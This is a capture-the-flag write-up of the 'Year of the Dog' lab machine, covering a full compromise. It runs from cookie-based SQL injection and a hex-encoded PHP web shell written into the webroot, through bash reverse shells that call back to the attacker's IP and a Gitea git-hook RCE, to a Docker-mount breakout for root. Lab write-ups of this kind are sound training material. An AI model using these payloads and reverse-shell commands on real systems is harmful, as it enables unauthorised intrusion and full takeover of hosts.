## ENUMERATION
Nmap scan: `nmap -p- -vv <MACHINE-IP> -oG initial-scan` 
```
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63
```
SSH on port 22 and webserver on port 80 as usual.

## WEB SERVER

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20120630.png)

I used gobuster for any hidden directories but got nothing.<br>
Using burp , we see there is a cookie being stored. We could do some injection with the cookie.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20121211.png)

This confirms that SQLi is the way to go. UNION SELECT works.<br>
`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,database() -- -` gives databse `webapp`

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20122020.png)

`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='webapp' -- -` gives table `queue`

`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema='webapp' and table_name='queue'-- -` gives 2 columns : `userID` and `queueNum`

Seems like we can even write to webroot using :` INTO OUTFILE '/var/www/html/`<br>
`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,'testing' INTO OUTFILE '/var/www/html/test.txt'-- -` gives:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20124149.png)

Using Command : `Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,LOAD_FILE('/etc/passwd') -- -` we got 1 user:<br>
`dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash`
 
 As RCE detection is triggered by <? we'll have to hex encode our payload and then pass it through SQL unhex function.<br>
 `Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,UNHEX('3C3F7068702073797374656D28244745545B27636D64275D293B203F3E') INTO OUTFILE '/var/www/html/cmd.php' -- -`<br>
 Now if it works:

 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20142410.png)

It works!<br>
Now to move in , save this : `bash -i >& /dev/tcp/<IP Address>/<PORT> 0>&1` to a file and transfer it to the webserver using `<MACHINE-IP>/cmd.php?cmd=wget <YOUR-IP>:<PORT>/<file>`

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20143013.png)

You should be in:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20143345.png)

We are www-data. There is the user flag in dylan's home directory but we don't have the permission to read it. We can read the work_analysis file though.
In there we find Dylan's SSH password.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20143630.png)
![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20144149.png)

Using `ifconfig`, there seems to be a docker address. We don't seem to be in a container so probably that will come later.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20155929.png)

Using LinPeas , we find `/app/gitea/gitea web` process running under dylan. Also that localhost is available on port 3000.<br>
Let's use SSH port forwarding and check out that port<br>
`ssh dylan@<MACHINE-IP> -L 3000:localhost:3000`

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20144717.png)

Signing in as dylan we get a 2 factor authentication.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20144927.png)

Going back to dylan, checking `gitea` we find a db: `gitea.db` which is an SQLite3 database.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20150729.png)

Let's delete the `two_factor table` from `gitea.db`:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20151132.png)

And we're in:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20151257.png)

Now searching for any Gitea version 1.13.0 exploits , I found  [CVE-2020-14144](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce) exploit.<br>
In the Test-repo, we go to `settings` > `Git Hooks` > `Post Recieve Hook`.<br> In this hook , we can write a shell script that will get executed after getting a new commit.<br>

Add `bash -i >& /dev/tcp/<YOUR-IP>/<CHOSEN-PORT> 0>&1 ` to Post Recieve Hook and update it.<br>
Start a netcat listener, then on your local machine :
```
git clone http://localhost:3000/Dylan/Test-repo.git
cd Test-repo
echo "something" >> README.md
git add README.md
git commit -m 'RCE'
git push
```

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20153122.png)

## PRIVILEGE ESCALATION > ROOT
Now , we're in the container confirmed by the `.dockerenv` file in `/` and we gotta break out. We can `su` rightaway.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20154615.png)

Check the `/data/` directory as the files are usually mount to host.<br>

This is the case here as well as the files in `/data` are identical to the `/gitea` directory in Dylan's shell.<br>
Now just transfer the bash file located in `/bin/` to `/data/` and add the permissions.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20155558.png)

Back at Dylan's: run `./bash -p` and you got root.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20160038.png)






 
 
 
 



